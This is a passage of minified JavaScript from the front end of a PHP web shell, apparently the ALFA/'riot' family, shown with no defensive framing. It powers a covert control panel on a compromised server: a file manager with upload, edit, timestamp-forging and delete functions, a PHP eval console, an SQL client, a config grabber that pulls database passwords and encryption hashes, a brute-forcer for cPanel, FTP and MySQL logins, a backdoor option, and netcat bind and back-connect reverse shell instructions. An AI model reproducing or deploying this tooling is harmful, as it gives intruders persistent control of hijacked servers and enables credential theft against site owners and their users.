t&&(t(o.responseText,l),riotClearAjax(l)):4==o.readyState&&200!=o.status&&(riotAjaxError(o.status,l,o.statusText,o.responseText),riotClearAjax(l))},o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),void o.send(a)):void alert("Error !")}function riotClearAjax(e){_ALFA_AJAX_.hasOwnProperty(e)&&delete _ALFA_AJAX_[e]}function handleup(e,a){var t="__fnameup";if(0!=a&&(t="__fnameup"+a),e.files.length>1){for(var i="",l=0;l<e.files.length;l++)i+=e.files[0].name+", ";$(t).innerHTML=i}else e.files[0].name&&($(t).innerHTML=e.files[0].name)}function u(e){var a=!1,t=0,i=riot_current_fm_id,l=new FormData,o="filesman_holder_"+i;l.append("a",riotb64(e.a.value)),l.append("c",riotb64(e.c.value)),l.append("riot1",riotb64(e.riot1.value)),l.append("charset",riotb64(e.charset.value)),l.append("ajax",riotb64(e.ajax.value)),e.querySelectorAll("input[type=file]").forEach(function(e){if(0==e.value.length)return!1;if(e.files.length>1)for(var a=0;a<e.files.length;a++)l.append("f[]",e.files[a]);else l.append("f[]",e.files[0]);t++}),$("footerup").value="",$("__fnameup").innerHTML="";for(var r=1;r<=upcount;r++){var n=$("pfooterup_"+r);n&&n.parentNode.removeChild(n),upcount--}if(0==upcount&&upcount++,0==t)return!1;var s="up_bar_"+getRandom();$("up_bar_holder").insertAdjacentHTML("beforeend","<div id='"+s+"' class='up_bar'></div>");e.c.value;if(window.XMLHttpRequest?a=new XMLHttpRequest:window.ActiveXObject&&(a=new ActiveXObject("Microsoft.XMLHTTP")),a){var c=$(s);_ALFA_AJAX_[s]=a,a.upload&&(c.style.display="block",a.upload.onprogress=function(e){var a=e.position||e.loaded,t=e.totalSize||e.total,i=Math.floor(a/t*1e3)/10+"%";c.style.width=i}),a.onload=function(e){200===a.status?c.style.display="none":riotAjaxError(a.status,"upload_area",a.statusText,a.responseText),riotClearAjax(s)},a.onreadystatechange=function(){if(4==a.readyState&&200==a.status){if("noperm"!=a.responseText&&"[]"!=a.responseText){var e,t=JSON.parse(a.responseText),l="",r=d.querySelectorAll("#"+o+" #filemanager_table tr").length-3;for(e in t){++r;var n=t[e].name,s=encodeURIComponent(n),c=t[e].size,f=t[e].perm,_=t[e].modify,u=t[e].owner,p=loadType(n,"file");try{d.querySelector("#"+o+" .fmanager-row a[fname='"+n+"']").parentElement.parentElement.parentElement.remove()}catch(e){}l+='<tr class="fmanager-row" id="tr_row_'+r+'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'+n+'" class="chkbx" id="checkbox'+r+'"><label for="checkbox'+r+'"></label></div></td><td id="td_row_'+r+'">'+p+'<div style="position:relative;display:inline-block;bottom:12px;"><a row="'+r+'" id="id_'+r+'" class="main_name" onclick="editor(\''+s+"','auto','','','','file');\" href=\"#action=fileman&amp;path="+c_+"&amp;file="+s+'" fname="'+n+'" ftype="file" path="'+c_+'" opt_title="">'+n+'</a></div></td><td><span style="font-weight:unset;" class="main_size">'+c+'</span></td><td><span style="font-weight:unset;" class="main_modify">'+_+'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'+u+'</span></td><td><a id="id_chmode_'+r+'" href="javascript:void(0)" onclick="editor(\''+s+"','chmod','','','','file')\">"+f+'</a></td><td><a id="id_rename_'+r+'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'rename','','','','file')\">R</a> <a id=\"id_touch_"+r+'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''+s+"', 'touch','','','','file')\">T</a> <a id=\"id_edit_"+r+'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''+s+"', 'edit','','','','file')\">E</a> <a id=\"id_download_"+r+'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''+n+"', 'download')\">D</a><a id=\"id_delete_"+r+'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '+s+" # ?'); chk ? g('FilesMan',null,'delete', '"+s+"') : '';\"> X </a></td></tr>"}d.querySelector("#"+o+" #filemanager_last_tr").insertAdjacentHTML("beforebegin",l),riotShowNotification("File(s) uploaded successfully","Uploader"),riotFmngrContextRow()}else riotShowNotification("Folder has no permission...","Uploader","error");riotCheckCurrentFilesManTab(i)}},a.open("POST",d.URL),a.send(l)}}function riotCheckCurrentFilesManTab(e){-1==$("filesman_tab_"+e).classList.value.indexOf("filesman-tab-active")&&$("filesman_tab_"+e).classList.add("tab-is-done")}function g(a,c,riot1,riot2,riot3,riot4,riot5,riot6,riot7,riot8,riot9,riot10,charset){var fm_id=0==riot_fm_id?riot_current_fm_id:riot_fm_id,fm_id2=riot_fm_id,fm_path=null==c||0==c.length?c_:c,d_mf_c=fm_path,g_action_id=riot_before_do_action_id;0==riot_fm_id&&(set(a,c,riot1,riot2,riot3,riot4,riot5,riot6,riot7,riot8,riot9,riot10,charset),d_mf_c=d.mf.c.value),"GetConfig"!=a&&"download"!=riot2&&islinux&&"/"!=d_mf_c.substr(0,1)&&(d_mf_c="/"+d_mf_c),"FilesMan"==a?(riotloader("filesman_holder_"+fm_id,"block"),g_action_id="filesman_holder_"+fm_id):""!=g_action_id?riotloader(g_action_id,"block"):"FilesTools"!=a&&"download"!=riot2&&"GetConfig"!=a&&("sql"==a?(showEditor("database_window"),g_action_id=loadPopUpDatabase("")):"FilesMan"!=a&&(showEditor("options_window"),g_action_id=loadPopUpOpTions(a)),riotloader(g_action_id,"block"));for(var data="a="+riotb64(a)+"&c="+riotb64(d_mf_c)+"&",i=1;i<=10;i++)data+="riot"+i+"="+riotb64(eval("d.mf.riot"+i+".value"))+"&";if("FilesMan"==a){var pagenum=d.querySelector("#"+g_action_id+" .page-number.active-page-number");null!=pagenum&&(data+="pagenum="+riotb64(getCookie(g_action_id+"_page_number")),setCookie(g_action_id+"_page_number",1,2012))}if(data+="&ajax="+riotb64("true"),"FilesTools"==a&&"download"==riot2){riotLoaderOnTop("none");var dl=$("dlForm");return dl.a.value=riotb64("dlfile"),dl.c.value=riotb64(d_mf_c),dl.file.value=riotb64(riot1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data,function(e,t){evalJS(e);var i=!1;if(riotLoaderOnTop("none"),"sql"==a)return console.log(t),loadPopUpDatabase(e,t),!1;if("FilesMan"==a){riotloader("filesman_holder_"+fm_id,"none"),d.querySelector("#filesman_holder_"+fm_id).innerHTML=e,fm_path=fm_path.replace(/\/\//g,"/"),$("filesman_tab_"+fm_id).setAttribute("path",fm_path);var l=riotGetLastFolderName(fm_path);d.querySelector("#filesman_tab_"+fm_id+" span").innerHTML=l,riotFmngrContextRow(),"function"==typeof riot1&&riot1(e),riotCheckCurrentFilesManTab(fm_id)}else(options_window_is_minimized||"."==t.substr(0,1))&&"."==t.substr(0,1)&&(i=!0,t=t.substr(1),showEditor("options_window")),i||riotloader(t,"none"),loadPopUpOpTions(t,e),"phpeval"==a&&riotLoadAceEditor("PhpCode"),"coldumper"==a.substr(0,9)&&riotColDumperInit()},!1,""==g_action_id?"."+a:g_action_id),g_action_id="",0==fm_id2&&c!=c_&&c&&initDir(c)):(riotloader(riot3,"block"),_Ajax(d.URL,data,function(e,a){var t=a;a=d.querySelector("#"+("id_db"!=a.substr(0,5)?"option_"+a:a));try{(e=JSON.parse(e)).host&&e.user&&e.dbname&&($("db_host")&&(a.querySelector("#db_host").value=e.host),$("db_user")&&(a.querySelector("#db_user").value=e.user),$("db_name")&&(a.querySelector("#db_name").value=e.dbname),$("db_pw")&&(a.querySelector("#db_pw").value=e.password),$("db_prefix")&&e.prefix&&(a.querySelector("#db_prefix").value=e.prefix),$("cc_encryption_hash")&&e.cc_encryption_hash&&(a.querySelector("#cc_encryption_hash").value=e.cc_encryption_hash))}catch(e){}riotloader(t,"none")},!1,riot3))}function riotGetLastFolderName(e){var a=e.replace(/\/\//g,"/").split("/");for(var t in a)0==a[t].length&&a.splice(t,1);var i=a[a.length-1];return 0==i.length&&(i="/"),i}function riotloader(e,a){if(0==e.length)return!1;try{var t=$("loader_"+e);if(null==t&&"block"==a){var i=null;"editor"==e?i=d.querySelector("#editor .editor-modal"):"id_db"==e.substr(0,5)?i=$(e):"terminal_id"==e.substr(0,11)?i=$(e):"editor"==e.substr(0,6)?i=$(e):"cgiframe"==e?i=$("cgiframe"):"filesman_holder"==e.substr(0,15)?(i=$(e)).style.minHeight="300px":i=$("option_"+e),i.insertAdjacentHTML("afterbegin","<div id='loader_"+e+'\' class="options-loader-holder"><div parent="'+e+'" onclick="riotAjaxController(this);" class="stopAjax">[ Stop it ]</div><div class="riot-ajax-error"></div><img src=\'https://png.pngtree.com/png-vector/20231213/ourmid/pngtree-technology-border-blue-circle-sci-fi-ai-element-three-dimensional-buckle-png-image_11330449.png\'></div>')}else"filesman_holder"==e.substr(0,15)&&($(e).style.minHeight="0"),null!=t&&(t.style.display=a)}catch(e){}}function fs(e){var a=e.getAttribute("db_id"),t=d.querySelector("#"+a+" div.sf");mysql_cache.hasOwnProperty(a)||(mysql_cache[a]={}),riotloader(a,"block");var i=t.querySelector("input[name=sql_host]").value,l=t.querySelector("input[name=sql_login]").value,o=t.querySelector("input[name=sql_pass]").value,r=t.querySelector("input[name=sql_base]")?t.querySelector("input[name=sql_base]").value:t.querySelector("select[name=sql_base]").value,n=t.querySelector("select[name=type]").value,s=t.querySelector("input[name=sql_count]").checked?"true":"";_Ajax(d.URL,"a="+riotb64("Sql")+"&riot1="+riotb64("query")+"&riot2=&c="+riotb64(c_)+"&charset="+riotb64("UTF-8")+"&type="+riotb64(n)+"&sql_host="+riotb64(i)+"&sql_login="+riotb64(l)+"&sql_pass="+riotb64(o)+"&sql_base="+riotb64(r)+"&sql_count="+riotb64(s)+"&current_mysql_id="+riotb64(a)+"&ajax="+riotb64("true"),function(e,a){loadPopUpDatabase(e,a),evalJS(e),riotloader(a,"none")},!1,a)}function ctlbc(e){var a=$("bcStatus"),t=$("bcipAction");"bind"==e.value?(t.style.display="none",a.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(t.style.display="inline-block",a.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function $(e){return d.getElementById(e)}function addnewup(){var e="footerup_"+upcount,a="pfooterup_"+upcount,t=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",i=d.createElement("p");i.innerHTML='<label class="inputfile" for="'+e+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+e+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');" multiple>',i.id=a,i.appendAfter($(t)),upcount++}function riot_searcher_tool(e){switch(e){case"all":case"dirs":_riotSet(!0,"Disabled");break;case"files":_riotSet(!1,"php")}}function _riotSet(e,a){d.srch.ext.disabled=e,d.srch.ext.value=a}function dis_input(e){switch(e){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(e,a,t){c="21"!=a?"localhost":"ftp.example.com",$("port").disabled=e,$("port").value=a,$("target").value=c,$("protocol").value=t}function inBackdoor(e){"my"==e.value?$("backdoor_textarea").style.display="block":$("backdoor_textarea").style.display="none"}function saveByKey(e){return!("s"==String.fromCharCode(e.which).toLowerCase()&&e.ctrlKey||19==e.which)||($("editor_edit_area").onsubmit(),e.preventDefault(),!1)}function riotAjaxError(e,a,t,i){if(void 0!==a){var l=d.querySelector("#loader_"+a);null!=l&&(firewall="",403==e&&(firewall=" ~ FireWall Detected!"),l.querySelector("img").remove(),l.querySelector(".riot-ajax-error").innerHTML=e+" ( "+t+firewall+" )",riotShowNotification(t,"Ajax","error"))}}function riotInitCwdContext(){d.querySelectorAll(".header_pwd").forEach(function(e){e.addEventListener("contextmenu",function(e){var a=e.target.getAttribute("path"),t=d.querySelector("#rightclick_menu > a[name=newtab]");t.setAttribute("href","javascript:void(0);"),t.removeAttribute("target"),t.onclick=function(){riotFilesManNewTab(a,"/")};var i=e.clientX,l=e.clientY;riotSortMenuItems(["newtab"]),riotRightClickMenu(i,l),e.preventDefault()})})}function riotRightClickMenu(e,a){rightclick_menu_context.top=a+"px",rightclick_menu_context.left=e+"px",rightclick_menu_context.visibility="visible",rightclick_menu_context.opacity="1"}function riotSortMenuItems(e){var a=["newtab","link","download","view","edit","move","copy","rename","modify","permission","compress","extract","delete","view_archive"],t=!1;for(var i in a){for(var l in t=!1,e)a[i]!=e[l]||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="block",t=!0);t||(d.querySelector("#rightclick_menu > a[name="+a[i]+"]").style.display="none")}}function riotAceChangeSetting(e,a){var t=e.options[e.selectedIndex].value,i=e.getAttribute("base"),l=riot_ace_editors.editor;"eval"==i&&(l=riot_ace_editors.eval);var o=e.getAttribute("ace_id");"lang"==a?l[o].session.setMode("ace/mode/"+t):"theme"==a&&l[o].setTheme("ace/theme/"+t),setCookie("riot_ace_"+a+"_"+i,t,2012)}function riotAceChangeWrapMode(e,a){var t=riot_ace_editors.editor;"eval"==a&&(t=riot_ace_editors.eval);var i=e.getAttribute("ace_id");e.checked?t[i].session.setUseWrapMode(!0):t[i].session.setUseWrapMode(!1)}function riotAceChangeFontSize(e,a,t){var i=riot_ace_editors.editor;"eval"==e&&(i=riot_ace_editors.eval);var l=t.getAttribute("ace_id"),o=i[l].getFontSize();"+"==a?++o:--o,i[l].setFontSize(o),setCookie("riot_ace_fontsize_"+e,o,2012)}function setCookie(e,a,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3);var l="expires="+i.toUTCString();document.cookie=e+"="+a+";"+l+";path=/"}function getCookie(e){var a=("; "+document.cookie).split("; "+e+"=");if(2==a.length)return a.pop().split(";").shift()}function editorClose(e){if(d.body.style.overflow="visible",elem=$(e),elem.setAttribute("class","editor-anim-close"),"editor"==e){if(is_minimized=!1,null!=riot_ace_editors.editor&&null!=riot_ace_editors.editor){for(var a in riot_ace_editors.editor)riot_ace_editors.editor[a].destroy();riot_ace_editors.editor=null,d.querySelector(".editor-tabs").innerHTML="",d.querySelector(".editor-content-holder").innerHTML=""}}else if("cgiloader"==e)php_temrinal_using_cgi&&(d.querySelector(".terminal-tabs").innerHTML="",d.querySelector(".terminal-contents").innerHTML=""),php_temrinal_using_cgi=!1,cgi_is_minimized=!1;else if("options_window"==e){if(options_window_is_minimized=!1,null!=riot_ace_editors.eval){for(var a in riot_ace_editors.eval)riot_ace_editors.eval[a].destroy();riot_ace_editors.eval=null,d.querySelectorAll(".php-evals").forEach(function(e){e.removeAttribute("ace")})}}else"database_window"==e&&(database_window_is_minimized=!1);setTimeout(function(){elem=$(e),elem.removeAttribute("class"),elem.style.display="none","options_window"==e&&(elem.querySelector(".options_tab").innerHTML="",elem.querySelector(".options_content").innerHTML="")},1e3),d.body.style.overflow="visible"}function popupWindowBackPosition(){var e={cgiloader:cgi_is_minimized,options_window:options_window_is_minimized,database_window:database_window_is_minimized,editor:is_minimized},a=[];for(var t in e)e[t]&&a.push(t);1==a.length?$(a[0]+"-minimized").style.top="30%":2==a.length?($(a[0]+"-minimized").style.top="20%",$(a[1]+"-minimized").style.top="50%"):3==a.length?($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="60%"):4==a.length&&($(a[0]+"-minimized").style.top="0%",$(a[1]+"-minimized").style.top="30%",$(a[2]+"-minimized").style.top="55%",$(a[3]+"-minimized").style.top="80%")}function showEditor(e){if($(e).setAttribute("class","editor-anim-show"),$(e+"-minimized").setAttribute("class","minimized-hide"),"editor"==e)is_minimized=!1;else if("cgiloader"==e)cgi_is_minimized=!1;else if("options_window"==e){options_window_is_minimized=!1;var a=d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("riot_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return riotSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=riotb64(t)),void 0!==l&&null!=l&&0!=l.length)n=riotb64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=riotb64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='https://dev.artikelspiner.id/icon/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),riotloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?riotloader(b,"block"):(riotloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+riotb64("FilesTools")+"&c="+riotb64(f)+"&riot1="+riotb64(e)+"&riot2="+riotb64(a)+"&riot3="+r+"&riot4="+n+"&riot5=&riot6=&riot7=&riot8=&riot9=&riot10=&&ajax="+riotb64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),riotShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&riotUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?riotLoaderOnTop("none"):riotloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&riotShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&riotShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),riotLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function riotLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("riot-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="riot-ace-plugin",t.onload=function(){riotLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==riot_ace_editors.editor&&(riot_ace_editors.editor={});var i=getCookie("riot_ace_theme_editor"),l=getCookie("riot_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),riot_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),riot_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),riot_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),riot_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),riot_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),riot_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),riot_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){riot_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==riot_ace_editors.eval&&(riot_ace_editors.eval={});i=getCookie("riot_ace_theme_eval"),l=getCookie("riot_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),riot_ace_editors.eval["phpeval-"+o]=ace.edit(t),riot_ace_editors.eval["phpeval-"+o].setReadOnly(a),riot_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),riot_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),riot_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),riot_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){riot_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+riotb64("checkfiletype")+"&path="+riotb64(editor_files[t].pwd)+"&arg="+riotb64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","riot","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="https://dev.artikelspiner.id/icon/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("riot_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=riot_ace_editors.editor[e].selection.toJSON();riot_ace_editors.editor[e].selectAll(),riot_ace_editors.editor[e].focus(),document.execCommand("copy"),riot_ace_editors.editor[e].selection.fromJSON(a),riotShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=riotb64(e,!0),a=riotb64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return riotb64(i,!0)}function reloadSetting(e){return riotloader(riot_before_do_action_id,"block"),_Ajax(d.URL,"a="+riotb64("settings")+"&riot1="+riotb64(e.protect.value)+"&riot2="+riotb64(e.lgpage.value)+"&riot3="+riotb64(e.username.value)+"&riot4="+riotb64(e.password.value)+"&riot5="+riotb64(">>")+"&riot6="+riotb64(e.icon.value)+"&riot7="+riotb64(e.post_encrypt.value)+"&riot8="+riotb64("main")+"&riot9="+riotb64(e.cgi_api.value)+"&c="+riotb64(c_)+"&ajax="+riotb64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),riotloader(a,"none")},!1,riot_before_do_action_id),riot_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+riotb64("settings")+"&riot1="+riotb64(JSON.stringify(a))+"&riot2="+riotb64(">>")+"&riot3="+riotb64(t)+"&riot8="+riotb64("color")+"&c="+riotb64(c_)+"&ajax="+riotb64("true"),function(e){evalJS(e)},!0)}function riotb64(e,a){return void 